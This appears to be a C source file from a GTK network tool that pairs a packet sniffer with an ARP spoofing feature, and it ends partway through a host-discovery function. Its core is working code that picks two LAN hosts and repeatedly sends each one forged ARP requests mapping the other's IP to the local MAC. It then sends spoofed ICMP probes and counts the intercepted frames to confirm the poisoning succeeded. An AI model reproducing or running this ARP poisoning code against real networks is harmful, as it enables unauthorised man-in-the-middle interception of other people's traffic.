/*#ifdef HAVE_CONFIG_H
#  include <config.h>
#endif

#include <gtk/gtk.h>

#include "callbacks.h"
#include "interface.h"
#include "support.h"
*/

#ifdef HAVE_CONFIG_H
#  include <config.h>
#endif

#include <gtk/gtk.h>

#include "callbacks.h"
#include "interface.h"
#include "support.h"

#include "sniffer.h"
#include "tv.h"

#include "dbg.h"

#include<glib.h>
#include<pthread.h>
#include<signal.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<linux/if_ether.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h>
#include<netinet/tcp.h>
#include<netinet/udp.h>
#include<arpa/inet.h>
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<netinet/if_ether.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<errno.h>
#include<fcntl.h>
#include <features.h>
#if __GLIBC__ >= 2 && __GLIBC_MINOR >= 1
        #include <netpacket/packet.h>
        #include <net/ethernet.h>     /* the L2 protocols */
#else
       #include <asm/types.h>
       #include <linux/if_packet.h>
       #include <linux/if_ether.h>   /* The L2 protocols */
#endif



void
on_tb_start_clicked                    (GtkToolButton   *toolbutton,
                                        gpointer         user_data)
{
	GtkWidget * tb_start = lookup_widget(GTK_WIDGET(toolbutton), "tb_stop");
	gtk_widget_set_sensitive(GTK_WIDGET(toolbutton), FALSE);
	gtk_widget_set_sensitive(GTK_WIDGET(tb_start), TRUE);
	GtkWidget * list = lookup_widget(GTK_WIDGET(toolbutton), "treeview_2nd");
	
	GtkCellRenderer * render;
	GtkTreeModel * model;
	GtkListStore  *store;
	GtkTreeIter    iter;
	GList * cols;
	
	store = GTK_LIST_STORE(gtk_tree_view_get_model(GTK_TREE_VIEW (list)));
	if(store == NULL)
		;//printf("store is null\n");
	else
		gtk_list_store_clear(store);
		
	cols = gtk_tree_view_get_columns(GTK_TREE_VIEW(list));
	if(NULL == cols)
		init_list(list);
	
	pthread_t tid;
	pthread_create(&tid, NULL, sniffer, list);
}


void
on_tb_stop_clicked                     (GtkToolButton   *toolbutton,
                                        gpointer         user_data)
{
	GtkWidget * tb_start = lookup_widget(GTK_WIDGET(toolbutton), "tb_start");
	GtkWidget * list = lookup_widget(GTK_WIDGET(toolbutton), "treeview_2nd");
	g_object_set_data_full(G_OBJECT(list), "flag", (gpointer)FALSE, NULL);
	gtk_widget_set_sensitive(GTK_WIDGET(toolbutton), FALSE);
	
	int i;
	for(i=0; i<65535; i++) {
		if((gboolean)g_object_get_data(G_OBJECT(list), "flag")) {
			break;
		}
		usleep(100000);
	}
	gtk_widget_set_sensitive(GTK_WIDGET(tb_start), TRUE);
}


void
on_new1_activate                       (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_open1_activate                      (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_save1_activate                      (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_save_as1_activate                   (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_quit1_activate                      (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_cut1_activate                       (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_copy1_activate                      (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_paste1_activate                     (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_delete1_activate                    (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}


void
on_about1_activate                     (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{

}

/*******************************************************************************\
 *
 * manualy add
 *
\*******************************************************************************/

void select_one_iter(GtkWidget * treeview, GtkTreeModel * model, int idx) {
	if(-1 == idx) return;

	GtkTreeIter iter, found;
	gboolean f = FALSE;
	GtkTreePath * path, *fpath;
	GtkTreeSelection * selection;
	int s, e, ss, ee;
	
	gtk_tree_model_get_iter_first(model, &iter);
	
	gtk_tree_model_iter_next(model, &iter);
	
	do {
		gtk_tree_model_get (model, &iter, 1, &s, 2, &e, -1);
		
		if(idx < s || idx > e) {
			
			path = gtk_tree_model_get_path(model, &iter);
			if(!gtk_tree_model_iter_next(model, &iter)) {
				break;
			}
			
		} else {
			f = TRUE;
			memcpy(&found, &iter, sizeof(GtkTreeIter));
			fpath = gtk_tree_model_get_path(model, &iter);
			ss = s;
			ee = e;
					
			if(gtk_tree_model_iter_has_child(model, &iter)) {
				path = gtk_tree_model_get_path(model, &iter);
				gtk_tree_view_expand_row(GTK_TREE_VIEW(treeview), path, FALSE);
				GtkTreeIter child;
				gtk_tree_model_iter_children(model, &child, &iter);
				memcpy(&iter, &child, sizeof(GtkTreeIter));
			} else break;
			
		}
		
	} while(TRUE);
	
	if(!f) return;
	
	//printf("ss: %d, ee: %d\n", ss, ee);
	selection = gtk_tree_view_get_selection(GTK_TREE_VIEW(treeview));
	gtk_tree_selection_unselect_all(selection);
	gtk_tree_selection_select_iter(selection, &found);
	gtk_tree_view_scroll_to_cell(GTK_TREE_VIEW(treeview), fpath, NULL, TRUE, 0.5, 0);
	
}


void mark_set_callback(GtkTextBuffer *buffer, const GtkTextIter *new_location, GtkTextMark *mark, gpointer data) {
	//printf("mark_set_callback\n");
	int offset, idx, w=74, li, len;
	GtkTextIter s, e;
	
	gtk_text_buffer_get_bounds(buffer, &s, &e);
	len = strlen(gtk_text_buffer_get_text(buffer, &s, &e, TRUE));

	offset = gtk_text_iter_get_offset(new_location);
	li = offset % w;
	
	if(offset >= len) {
		return;
	} 
	
	if(6 <= li && 29 >= li) {
		
		idx = offset / w * 16 + (li - 6) / 3;
		
	} else if(31 <= li && 54 >= li) {
	
		idx = offset / w * 16 + (li - 31) / 3 + 8;
	
	} else if(56 <= li && 64 >= li) {
	
		idx = offset / w * 16 + li - 56;
	
	} else if(65 <= li && 73 >= li) {
	
		idx = offset / w * 16 + li - 65 + 8;
	
	} else {
		idx = -1;
	}
		
	//printf("idx: %d\n\n", idx);
	//g_printf("mark - %d\n\n", offset);	
	
	GtkWidget * treeview = lookup_widget(GTK_WIDGET(data), "treeview_3rd");
	GtkTreeModel *model;
	model = gtk_tree_view_get_model(GTK_TREE_VIEW(treeview));
	//gtk_window_set_focus();
	select_one_iter(treeview, model, idx);
	//gtk_window_set_focus(wnd, NULL);
}


void on_model_row_inserted(GtkTreeModel * tree_model, GtkTreePath * path, GtkTreeIter * iter, gpointer user_data) {

	gtk_tree_view_scroll_to_cell(GTK_TREE_VIEW(user_data), path, NULL, TRUE, 1.0, 0.0);	

}


/*******************************************************************************\
 *
 * manualy add - spoof part
 *
\*******************************************************************************/

void sh_mem(void * buf, int len) {
	u_int8_t * mem = (char *)buf;
	int i=0;
	
	for(i=0; i<len; i++) {
		if(i%16 == 0)
			printf("\n");
		printf("%02x ", mem[i]);
	}
}

enum
{
	LIST_1ST = 0,
	LIST_2ND,
	LIST_IP,
	LIST_MAC,
	LIST_STATE,
	LIST_RCV,
	LIST_SND,
	N_COLUMNS1
};
#define DBG1_ON1
#define DBG1(arg) printf(arg)


struct arp_frame{
	u_int8_t eth_d_mac[6];
	u_int8_t eth_s_mac[6];
	u_int16_t eth_type;
	
	unsigned short int ar_hrd;
	unsigned short int ar_pro;
	unsigned char ar_hln;
	unsigned char ar_pln;
	unsigned short int ar_op;
		
	u_int8_t arp_sha[ETH_ALEN];
	u_int8_t arp_spa[4];
	u_int8_t arp_tha[ETH_ALEN];
	u_int8_t arp_tpa[4];
};

union arp_buf_un{
	u_int8_t buf[1000];
	struct arp_frame arp_frm;
};



/*
#pragma pack(1) 
struct icmp_frame {
	struct ether_header eth_hdr;
	struct ip ip_hdr;
	struct icmp icmp_hdr;
};
#pragma pack() 
union {
	u_int8_t buf[80];
	struct icmp_frame icmp_frm;
} un;*/

//#define eth_hdr 	un.icmp_frm.eth_hdr
//#define ip_hdr 		un.icmp_frm.ip_hdr
//#define icmp_hdr 	un.icmp_frm.icmp_hdr

// global variable
gboolean host_on[256];
u_int8_t mac_loc[6];
u_int32_t ip_loc;
int if_index;
int hosts_selected;
gboolean all_snd = FALSE;
GdkPixbuf * ico_ok, * ico_bad, * ico_not_set;
gboolean _1st = FALSE, _2nd = FALSE;
GtkTreePath *p_1st = NULL, *p_2nd = NULL;
pthread_t tid_spoof = -1, tid_snd_icmp = -1, tid_rcv = -1;
int rcv_icmp_num1 = 0, rcv_icmp_num2 = 0, rcv_total_num1 = 0, rcv_total_num2 = 0;
GtkTreeModel *m;
gboolean rcv_lo_end = FALSE;

u_int8_t icmp_buf[80];



/***************************************************************************\
 *
 * icmp, snd my icmp whos ip filed is not local ip, so, if we get response,
 * that means the target host's arp table is posioned.
 *
\***************************************************************************/

unsigned short checksum(unsigned short *buf,int nword) {
	unsigned long sum;
       
	for(sum=0;nword>0;nword--)
		sum += *buf++;
	sum = (sum>>16) + (sum&0xffff);
	sum += (sum>>16);
       
	return ~sum;
}

uint16_t
in_cksum(uint16_t *addr, int len)
{
	int				nleft = len;
	uint32_t		sum = 0;
	uint16_t		*w = addr;
	uint16_t		answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

		/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w ;
		sum += answer;
	}

		/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;				/* truncate to 16 bits */
	return(answer);
}


// build icmp package
//void build_pkg(char * sipstr, char * smacstr, char * tipstr, u_int8_t * tmacaddr) {
void build_pkg(u_int32_t sipaddr, u_int32_t tipaddr, u_int8_t * tmacaddr) {
	memset(icmp_buf, 0, 74);
	struct ether_header * eth_hdr;
	struct ip * ip_hdr;
	struct icmp * icmp_hdr;
	
	eth_hdr = (struct ether_header *)icmp_buf;
	ip_hdr = (struct ip *)(icmp_buf + 14);
	icmp_hdr = (struct icmp *)(icmp_buf + 34);
	//ethernet header
	memcpy(eth_hdr->ether_shost, mac_loc, 6);
	memcpy(eth_hdr->ether_dhost, tmacaddr, 6);
	eth_hdr->ether_type = htons(ETHERTYPE_IP);
	
	//ip header
	//ip_hdr->ip_v = IPVERSION;
	ip_hdr->ip_hl = 5;
	ip_hdr->ip_v = IPVERSION;

	//printf("3-%d\n", icmp_buf[14]);
	
	ip_hdr->ip_tos = 0;
	//ip_hdr->ip_len = htons(sizeof(struct icmp_frame) + 31);
	ip_hdr->ip_len = htons(60);
	ip_hdr->ip_id = 0;
	ip_hdr->ip_off = 0;
	ip_hdr->ip_ttl = MAXTTL;
	ip_hdr->ip_p = IPPROTO_ICMP;
	ip_hdr->ip_sum = 0;
	ip_hdr->ip_dst.s_addr = tipaddr;
	ip_hdr->ip_src.s_addr = sipaddr;
	
	ip_hdr->ip_sum = checksum((unsigned short *)ip_hdr, 20);
	
	//icmp header
	icmp_hdr->icmp_type = 8;
	icmp_hdr->icmp_code = 0;
	icmp_hdr->icmp_cksum = 0;
	icmp_hdr->icmp_id = 1;
	icmp_hdr->icmp_seq = 1;
	memset(icmp_hdr->icmp_data, 0xa5, 32);
	
	icmp_hdr->icmp_cksum = in_cksum((uint16_t *)icmp_hdr, 40);
	
	//sh_mem(icmp_buf, 74);
}


void * check_is_spoofed(void * arg) {
	GtkTreeModel *model = (GtkTreeModel *) arg;
	GtkTreeIter iter;
	int sockfd;
	struct ifreq ifreq;
	struct sockaddr_ll l2addr;
	char * tipstr1st, *tipstr2nd;
	char * tmacstr1st, *tmacstr2nd;
	u_int32_t tipaddr1st, tipaddr2nd;
	u_int8_t tmacaddr1st[6], tmacaddr2nd[6];
	
	
	gtk_tree_model_get_iter (model, &iter, p_1st);
	gtk_tree_model_get(model, &iter, LIST_IP, &tipstr1st, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr1st, -1);
	
	gtk_tree_model_get_iter (model, &iter, p_2nd);
	gtk_tree_model_get(model, &iter, LIST_IP, &tipstr2nd, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr2nd, -1);
	
	inet_pton(AF_INET, tipstr1st, &tipaddr1st);
	inet_pton(AF_INET, tipstr2nd, &tipaddr2nd);
	ether_aton_r(tmacstr1st, (struct ether_addr *)tmacaddr1st);
	ether_aton_r(tmacstr2nd, (struct ether_addr *)tmacaddr2nd);
	
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0) {
		perror("socket error");
		return NULL;
	}
	
	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.sll_ifindex = if_index;
	
	while(-1 != tid_snd_icmp) {
		//build_pkg(tipaddr2nd, tipaddr1st, tmacaddr1st);
		build_pkg(tipaddr2nd, tipaddr1st, tmacaddr1st);
		if(sendto(sockfd, icmp_buf, 74, 0, (struct sockaddr *)&l2addr, sizeof(l2addr)) < 0){
			perror("snd failed");
			close(sockfd);
			return NULL;
		}
	
		// 2nd icmp
		//build_pkg(tipaddr1st, tipaddr2nd, tmacaddr2nd);
		build_pkg(tipaddr1st, tipaddr2nd, tmacaddr2nd);
		if(sendto(sockfd, icmp_buf, 74, 0, (struct sockaddr *)&l2addr, sizeof(l2addr)) < 0){
			perror("snd failed");
			close(sockfd);
			return NULL;
		}
		usleep(1000000);
	}
	
	//printf("check_is_spoofed end \n");
}


void sig_alarm() {
	if(-1 == tid_rcv) {
		alarm(0);
		return;
	} else alarm(1);
	
	GtkTreeIter iter;
	//printf("%d, %d  -  %d, %d\n", rcv_total_num1, rcv_total_num2, rcv_icmp_num1, rcv_icmp_num2);
	// 1st
	gtk_tree_model_get_iter (m, &iter, p_1st);
	
	gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_RCV, rcv_total_num1, -1);
	gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_SND, rcv_total_num2, -1);
	
	if(rcv_icmp_num1) {
		gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_STATE, ico_ok, -1);
	} else {
		gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_STATE, ico_bad, -1);
	}
	rcv_icmp_num1 = 0;
	
	// 2nd
	gtk_tree_model_get_iter (m, &iter, p_2nd);
	
	gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_RCV, rcv_total_num2, -1);
	gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_SND, rcv_total_num1, -1);
	
	if(rcv_icmp_num2) {
		gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_STATE, ico_ok, -1);
	} else {
		gtk_list_store_set (GTK_LIST_STORE (m), &iter, LIST_STATE, ico_bad, -1);
	}
	rcv_icmp_num2 = 0;
	
	//printf("%d, %d  -  %d, %d\n", rcv_total_num1, rcv_total_num2, rcv_icmp_num1, rcv_icmp_num2);
	
}

// recieve loop
void * recieve(void * arg) {
	GtkTreeModel *model = (GtkTreeModel *) arg;
	GtkTreeIter iter;
	char buf[65535];
	int sockfd;
	struct ifreq ifreq;
	struct sockaddr_ll l2addr;
	char * tipstr1st, *tipstr2nd;
	char * tmacstr1st, *tmacstr2nd;
	u_int8_t tmacaddr1st[6], tmacaddr2nd[6];
	struct ether_header * p_eth_hdr;
	struct ip * p_ip_hdr;
	struct icmp * p_icmp_hdr;
	
	
	gtk_tree_model_get_iter (model, &iter, p_1st);
	//gtk_tree_model_get(model, &iter, LIST_IP, &tipstr1st, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr1st, -1);
	
	gtk_tree_model_get_iter (model, &iter, p_2nd);
	//gtk_tree_model_get(model, &iter, LIST_IP, &tipstr2nd, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr2nd, -1);
	
	//inet_pton(AF_INET, tipstr1st, &tipaddr1st);
	//inet_pton(AF_INET, tipstr2nd, &tipaddr2nd);
	ether_aton_r(tmacstr1st, (struct ether_addr *)tmacaddr1st);
	ether_aton_r(tmacstr2nd, (struct ether_addr *)tmacaddr2nd);
	
	//printf("%s, %s\n", tmacstr1st, tmacstr2nd);
	
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket error");
		return NULL;
	}
	signal(SIGALRM, sig_alarm);
	sig_alarm();
	
	char mac1[18], mac2[18];
	while(-1 != tid_rcv) {
	//printf("\n%d\n", tid_rcv);
		//printf("get one frame.\n");
		recvfrom(sockfd, buf, 74, 0, NULL, NULL);		
		
		p_eth_hdr = (struct ether_header *)buf;
		if(0 == memcmp(p_eth_hdr->ether_shost, tmacaddr1st, 6)) {
			
			if(ETHERTYPE_IP == ntohs(p_eth_hdr->ether_type)) {
				
				p_ip_hdr = (struct ip *)(buf+14);
				if(IPPROTO_ICMP == p_ip_hdr->ip_p) {
					//printf("\n**************************************\n");
					//sh_mem(buf, 74);
					if((char)0xa5 == buf[14+p_ip_hdr->ip_hl*4+8])
						rcv_icmp_num1++;
					else rcv_total_num1++;
				}
			} else rcv_total_num1++;
			
		} else if(0 == memcmp(p_eth_hdr->ether_shost, tmacaddr2nd, 6)) {
			
			if(ETHERTYPE_IP == ntohs(p_eth_hdr->ether_type)) {
				
				p_ip_hdr = (struct ip *)(buf+14);
				if(IPPROTO_ICMP == p_ip_hdr->ip_p) {
					//printf("\n**************************************\n");
					//sh_mem(buf, 74);
					if((char)0xa5 == buf[14+p_ip_hdr->ip_hl*4+8])
						rcv_icmp_num2++;
					else rcv_total_num2 ++;
				} else rcv_total_num2 ++;
			}
		}
		usleep(1000);
	}
	//printf("------->recieve end\n");
}

/***************************************************************************\
 *
 * arp spoofing
 *
\***************************************************************************/

void * arp_spoofing(void * arg) {
	
	GtkTreeModel *model = (GtkTreeModel *) arg;
	GtkTreeIter iter;
	int sockfd;
	u_int32_t tipaddr1st, tipaddr2nd;
	u_int8_t tmacaddr1st[6], tmacaddr2nd[6];
	u_int8_t fake_smacaddr[6];
	union arp_buf_un un;
	struct arp_frame * frm = &un.arp_frm;
	struct sockaddr_ll l2addr;
	struct ifreq ifreq;
	
	char * tipstr1st, *tipstr2nd; /* target host ip */
	char * tmacstr1st, *tmacstr2nd;
	
	
	gtk_tree_model_get_iter (model, &iter, p_1st);
	gtk_tree_model_get(model, &iter, LIST_IP, &tipstr1st, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr1st, -1);
	
	gtk_tree_model_get_iter (model, &iter, p_2nd);
	gtk_tree_model_get(model, &iter, LIST_IP, &tipstr2nd, -1);
	gtk_tree_model_get(model, &iter, LIST_MAC, &tmacstr2nd, -1);

	//printf("%s, %s\n\n", tipstr1st, tipstr2nd);
	
	//------------------
	
	
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		perror("socket error");
		return NULL;
	}
	
	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.sll_ifindex = if_index;
	
	memcpy(fake_smacaddr, mac_loc, 6);
	
	/* turn ascii addr in binary fmt */
	inet_pton(AF_INET, tipstr1st, &tipaddr1st);
	inet_pton(AF_INET, tipstr2nd, &tipaddr2nd);
	ether_aton_r(tmacstr1st, (struct ether_addr *)tmacaddr1st);
	ether_aton_r(tmacstr2nd, (struct ether_addr *)tmacaddr2nd);
	//inet_pton(AF_INET, fake_sipstr, &fake_sipaddr);
	
	/* full fill the arp frame */
	/* ethernet header */
	memcpy(frm->eth_s_mac, mac_loc, 6);
	//memcpy(frm->eth_d_mac, "\xff\xff\xff\xff\xff\xff", 6);
	frm->eth_type = htons(ETH_P_ARP);
	
	/* arp hdr */
	frm->ar_hrd = htons(0x0001);
	frm->ar_pro = htons(0x0800);
	frm->ar_hln = 6;
	frm->ar_pln = 4;
	frm->ar_op = htons(ARPOP_REQUEST);
	
	/* arp data */
	memcpy(frm->arp_sha, mac_loc, 6);
	//memcpy(frm->arp_spa, &tipaddr, 4);
	memcpy(frm->arp_tha, "\x00\x00\x00\x00\x00\x00", 6); /* not necessary */
	//memcpy(frm->arp_tpa, &tipaddr, 4);
	
	while(-1 != tid_spoof) {
		//1st one
		memcpy(frm->arp_spa, &tipaddr2nd, 4);
		memcpy(frm->arp_tpa, &tipaddr1st, 4);
		memcpy(frm->eth_d_mac, tmacaddr1st, 6);
	
		/* now it's time to send our data (1st) */	
		if(sendto(sockfd, un.buf, sizeof(struct arp_frame), 0, (struct sockaddr *)&l2addr, sizeof(l2addr)) < 0){
			perror("snd failed");
			close(sockfd);
			return NULL;
		}
	
		//2nd one
		memcpy(frm->arp_spa, &tipaddr1st, 4);
		memcpy(frm->arp_tpa, &tipaddr2nd, 4);
		memcpy(frm->eth_d_mac, tmacaddr2nd, 6);
	
		/* now it's time to send our data (2nd) */	
		if(sendto(sockfd, un.buf, sizeof(struct arp_frame), 0, (struct sockaddr *)&l2addr, sizeof(l2addr)) < 0){
			perror("snd failed");
			close(sockfd);
			return NULL;
		}
		sleep(5);
	}
	
	//printf("arp_spoofing > end");
	return NULL;
}



/***************************************************************************\
 *
 * checkbox click handler
 *
\***************************************************************************/
void fixed_toggled (GtkCellRendererToggle *cell, gchar *path_str, gpointer data)
{

#ifdef DBG1_ON
DBG1("fixed_toggled > s\n");
#endif
	
    GtkTreeModel *model = (GtkTreeModel *) data;
    GtkTreeIter iter;
    GtkTreePath *path = gtk_tree_path_new_from_string (path_str), *p_tmp;
    gboolean fixed;
 
    /* get toggled iter */
    gtk_tree_model_get_iter (model, &iter, path);

    /* Get previous value*/
    gtk_tree_model_get (model, &iter, LIST_1ST, &fixed, -1);

    /* Toggle the previous value */
    if(_1st && !fixed)return;
    fixed ^= 1;
    p_tmp = p_1st;
    p_1st = path;
    if(NULL != p_tmp)
    	gtk_tree_path_free (p_tmp);
 
    /* set new value */
    gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_1ST, fixed, -1);
    
     /* clean up allocated path */
    //gtk_tree_path_free (path);
    
    _1st ^= 1;
    
    if(!_1st) {
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_STATE, ico_not_set, -1);
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_RCV, 0, -1);
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_SND, 0, -1);
    	rcv_total_num1 = rcv_total_num2 = 0;
    	//gtk_tree_model_get_iter (model, &iter, p_2nd);
    	//gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_STATE, ico_not_set, -1);
    }
    
    if(_1st && _2nd) {
    	pthread_create(&tid_spoof, NULL, arp_spoofing, (void *)model);
    	pthread_create(&tid_snd_icmp, NULL, check_is_spoofed, (void *)model);
    	pthread_create(&tid_rcv, NULL, recieve, (void *)model);
    	//printf("\n>>> tids : %d, %d, %d\n", tid_spoof, tid_snd_icmp, tid_rcv);
    } else {
    	if(-1 != tid_spoof) {
    		pthread_cancel(tid_spoof);
    		tid_spoof = -1;
    	}
    	if(-1 != tid_snd_icmp) {
    		pthread_cancel(tid_snd_icmp);
    		tid_snd_icmp = -1;
    	}
    	if(-1 != tid_rcv) {
    		pthread_cancel(tid_rcv);
    		tid_rcv = -1;
    	}   
    	//printf("\ntids : %d, %d, %d\n", tid_spoof, tid_snd_icmp, tid_rcv);
    }
    
    //printf("%s , %s\n", _1st?"Set":"Not Set", _2nd?"Set":"Not Set");
    
#ifdef DBG1_ON
DBG1("fixed_toggled > s\n");
#endif

}

void fixed_toggled1 (GtkCellRendererToggle *cell, gchar *path_str, gpointer data)
{

#ifdef DBG1_ON
DBG1("fixed_toggled1 > s\n");
#endif
	
    GtkTreeModel *model = (GtkTreeModel *) data;
    GtkTreeIter iter;
    GtkTreePath *path = gtk_tree_path_new_from_string (path_str), *p_tmp;
    gboolean fixed;
 
    /* get toggled iter */
    gtk_tree_model_get_iter (model, &iter, path);

    /* Get previous value*/
    gtk_tree_model_get (model, &iter, LIST_2ND, &fixed, -1);

    /* Toggle the previous value */
    if(_2nd && !fixed)return;
    fixed ^= 1;
    p_tmp = p_2nd;
    p_2nd = path;
    if(NULL != p_tmp)
    	gtk_tree_path_free (p_tmp);
 	
    /* set new value */
    gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_2ND, fixed, -1);
    
     /* clean up allocated path*/
    //gtk_tree_path_free (path);
    
    _2nd ^= 1;
    
    if(!_2nd) {
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_STATE, ico_not_set, -1);
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_RCV, 0, -1);
    	gtk_list_store_set (GTK_LIST_STORE (model), &iter, LIST_SND, 0, -1);
    	rcv_total_num1 = rcv_total_num2 = 0;
    }
    
    if(_1st && _2nd) {
    	pthread_create(&tid_spoof, NULL, arp_spoofing, (void *)model);
    	pthread_create(&tid_snd_icmp, NULL, check_is_spoofed, (void *)model);
    	pthread_create(&tid_rcv, NULL, recieve, (void *)model);
    	//printf("\n>>> tids : %d, %d, %d\n", tid_spoof, tid_snd_icmp, tid_rcv);
    	//statistics
    } else {
    	if(-1 != tid_spoof) {
    		pthread_cancel(tid_spoof);
    		tid_spoof = -1;
    	}
    	if(-1 != tid_snd_icmp) {
    		pthread_cancel(tid_snd_icmp);
    		tid_snd_icmp = -1;
    	}
    	if(-1 != tid_rcv) {
    		pthread_cancel(tid_rcv);
    		tid_rcv = -1;
    	}   
    	//printf("\ntids : %d, %d, %d\n", tid_spoof, tid_snd_icmp, tid_rcv);
    }
    
    //printf("%s , %s\n", _1st?"Set":"Not Set", _2nd?"Set":"Not Set");
    
#ifdef DBG1_ON
DBG1("fixed_toggled1 > s\n");
#endif

}


/***************************************************************************\
 *
 * initalization of tree list
 *
\***************************************************************************/
void init_list1(GtkWidget *list)
{
#ifdef DBG1_ON
DBG1("init_list1 > s\n");
#endif

  GtkCellRenderer * renderer;
  GtkTreeViewColumn * column;
  GtkListStore * store;
  GtkTreeModel * model;

  store = gtk_list_store_new(
  	N_COLUMNS1, 
  	G_TYPE_BOOLEAN, 	//first
  	G_TYPE_BOOLEAN, 	//second
  	G_TYPE_STRING, 	//IP
  	G_TYPE_STRING, 	//MAC
  	GDK_TYPE_PIXBUF,//STATE
  	G_TYPE_INT, 	//RCV
  	G_TYPE_INT	//SND
  	);

  gtk_tree_view_set_model(GTK_TREE_VIEW(list), GTK_TREE_MODEL(store));
  g_object_unref(store);
  
  model = gtk_tree_view_get_model (GTK_TREE_VIEW(list));
  m = model;
  renderer = gtk_cell_renderer_toggle_new();
  g_signal_connect(renderer, "toggled", G_CALLBACK(fixed_toggled), model);
  column = gtk_tree_view_column_new_with_attributes("1st", renderer, "active", LIST_1ST, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);
  
  renderer = gtk_cell_renderer_toggle_new();
  g_signal_connect(renderer, "toggled", G_CALLBACK(fixed_toggled1), model);
  column = gtk_tree_view_column_new_with_attributes("2nd", renderer, "active", LIST_2ND, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);
  
  
  renderer = gtk_cell_renderer_text_new();
  column = gtk_tree_view_column_new_with_attributes("IP", renderer, "text", LIST_IP, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);
  
  renderer = gtk_cell_renderer_text_new();
  column = gtk_tree_view_column_new_with_attributes("MAC", renderer, "text", LIST_MAC, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);
  

  renderer = gtk_cell_renderer_pixbuf_new();
  column = gtk_tree_view_column_new_with_attributes("State", renderer, "pixbuf", LIST_STATE, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);
  //g_object_set(r_pix, "pixbuf", icon);

  renderer = gtk_cell_renderer_text_new();
  column = gtk_tree_view_column_new_with_attributes("Recive", renderer, "text", LIST_RCV, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column);   
  
  renderer = gtk_cell_renderer_text_new();
  column = gtk_tree_view_column_new_with_attributes("Send", renderer, "text", LIST_SND, NULL);
  gtk_tree_view_append_column(GTK_TREE_VIEW(list), column); 
  
  
#ifdef DBG1_ON
DBG1("init_list1 > e\n");
#endif  
}


/***************************************************************************\
 *
 * add a row to tree list
 *
\***************************************************************************/
void add_to_list1(GtkWidget *list, 
	gboolean m_1st, gboolean m_2nd, const gchar * ip,  const gchar * mac, GdkPixbuf * state, int rcv, int snd) {

#ifdef DBG1_ON
DBG1("add_to_list1 > s\n");
#endif  
  
  GtkListStore *store;
  GtkTreeIter iter;

  store = GTK_LIST_STORE(gtk_tree_view_get_model(GTK_TREE_VIEW(list)));
  gtk_list_store_append(store, &iter);
  
  gtk_list_store_set(store, &iter, 
  	LIST_1ST, m_1st,
  	LIST_2ND, m_2nd,
  	LIST_IP, ip,
  	LIST_MAC, mac,
  	LIST_STATE, state,
  	LIST_RCV, rcv,
  	LIST_SND, snd, -1);

#ifdef DBG1_ON
DBG1("add_to_list1 > e\n");
#endif 

}







/***************************************************************************\
 *
 * send arp request to all possible hosts on len
 *
\***************************************************************************/
void* snd_arp_req(void * arg) {
	int sockfd, i;
	u_int8_t mac_tag[6];
	u_int32_t ip_tag;
	struct ifreq ifreq;
	union arp_buf_un un;
	struct arp_frame * frm = &un.arp_frm;
	struct sockaddr_ll l2addr;
	GtkWidget * lst = (GtkWidget *)arg;
	
	char ip_str[16], mac_str[18];
		
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		perror("socket error");
		return NULL;
	}
	
	memset(&l2addr, 0, sizeof(l2addr));
